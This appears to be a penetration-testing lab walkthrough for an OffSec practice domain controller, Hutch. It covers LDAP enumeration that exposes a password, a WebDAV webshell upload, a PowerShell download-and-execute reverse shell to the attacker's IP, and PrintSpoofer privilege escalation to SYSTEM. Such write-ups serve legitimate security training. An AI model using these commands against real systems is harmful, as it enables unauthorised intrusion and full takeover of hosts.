---
tags:
  - Windows
  - LDAP
  - Privilege-Escalation
  - WebDAV
---
Difficulty: Intermediate
# Environment Setup
```
export IP=192.168.148.122
```

# Credentials

`fmcsorley:CrabSharkJellyfish192`

---

# Service Enumeration

`nmap -sC -sV -T4 -Pn -p- -oA full_tcp $IP`

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan:
|   Server Type: Microsoft-IIS/10.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Server Date: Sat, 12 Jul 2025 00:43:32 GMT
|_  WebDAV type: Unknown
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-12 00:42:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49834/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-07-12T00:43:37
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

This looks like a domain controller. We have DNS, an IIS web server, Kerberos, WMI, NetBIOS, LDAP, SMB, and NTP.

## Port 53 - DNS
From the nmap output we see this hostname is HUTCHDC, and the domain is hutch.offsec.

I'll query using dig:

`dig any hutch.offsec @$IP`

```
; <<>> DiG 9.20.9-1-Debian <<>> any hutch.offsec @192.168.236.122
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 23990
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;hutch.offsec.                  IN      ANY

;; ANSWER SECTION:
hutch.offsec.           600     IN      A       192.168.120.108
hutch.offsec.           3600    IN      NS      hutchdc.hutch.offsec.
hutch.offsec.           3600    IN      SOA     hutchdc.hutch.offsec. hostmaster.hutch.offsec. 20 900 600 86400 3600

;; ADDITIONAL SECTION:
hutchdc.hutch.offsec.   3600    IN      A       192.168.236.122

;; Query time: 204 msec
;; SERVER: 192.168.236.122#53(192.168.236.122) (TCP)
;; WHEN: Sat Jul 12 15:58:48 PDT 2025
;; MSG SIZE  rcvd: 142
```

I'll also confirm that we aren't able to initiate a zone transfer.

`dig axfr hutch.offsec @$IP`

```
; <<>> DiG 9.20.9-1-Debian <<>> axfr hutch.offsec @192.168.236.122
;; global options: +cmd
; Transfer failed.
```
## Port 80 - HTTP

![[Pasted image 20250711172246.png]]

Nothing found by brute forcing subdirectories.

## Port 389 - LDAP
I'm less familiar with enumerating LDAP so I'll start with [the HackTricks page](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html), which gave me a start with ldapsearch. I was able to use the following command to enumerate more info including some domain users.

`ldapsearch -H ldap://$IP:389/ -x -D '' -b 'DC=hutch,DC=offsec'`

I grepped this output for "dn:" to gain a list of distinguished names of OUs, groups, and users.

Looking through output and searching through other terms, I found that Freddy McSorley (sAMAccountName fmcsorley) has a password exposed in the description field:

```
# Freddy McSorley, Users, hutch.offsec
dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at user's request.
```

We should test this against the domain to see if these are still vaId credentials.

I'll [install netexec](https://www.netexec.wiki/getting-started/installation/installation-on-unix) and run:

`netexec ldap $IP -u '' -p ''`
(successful, 14 users)

`nxc ldap $IP -u 'fmcsorley' -p 'CrabSharkJellyfish192' --users`
(successful, 17 users)

I notice that once authenticated, we see a user with sAMAccountName domainadmin.

I'll try connecting to the WebDAV shares using Cadaver next.

## Port 80 - WebDAV
Now armed with domain credentials, we can test the WebDAV share using cadaver. Once again, I'll refer to [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/put-method-webdav.html?highlight=webdav#webdav), but the usage turns out to be quite simple and similar to FTP.

![[Pasted image 20250712171327.png]]

We land in webroot and can use this to upload /usr/share/webshells/aspx/cmdasp.aspx, then visit it in our browser to gain RCE.

![[Pasted image 20250712171621.png]]

![[Pasted image 20250712171508.png]]


Next we'll want to establish a more robust reverse shell.

# Initial Access / Reverse Shell
We can use https://github.com/antonioCoco/ConPtyShell.

Start a listener on our attacking machine
`stty raw -echo; (stty size; cat) | nc -lvnp 3001`

and serve Invoke-ConPtyShell.ps1
`git clone https://github.com/antonioCoco/ConPtyShell.git && cd ConPtyShell && python3 -m http.server 80`
`python3`

On target machine webshell (making sure to replace `<LHOST>`)
`Powershell IEX(IWR http://192.168.45.208:80/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.45.208 -RemotePort 3001 -Rows 24 -Cols 80`

![[Pasted image 20250712180100.png]]

# Privilege Escalation
`whoami /priv`

```
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` is enabled, which means we should be able to use PrintSpoofer or a [potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) exploit depending on the Windows version to gain System.

`systeminfo` tells us that we're on Windows Server 2019 Standard, version 10.0.17763 N/A Build 17763.

I'll download PrintSpoofer to my attacking machine, transfer to the server, and execute it.

Download on target machine from attacking machine
`certutil -urlcache -split -f http://192.168.45.208/PrintSpoofer64.exe`

Execute on attacking machine to gain System.
`.\PrintSpoofer.exe -i -c cmd`

![[Pasted image 20250712182450.png]]

The flags are in C:\Users\fmcsorley\Desktop\local.txt and C:\Users\Administrator\Desktop\proof.txt.
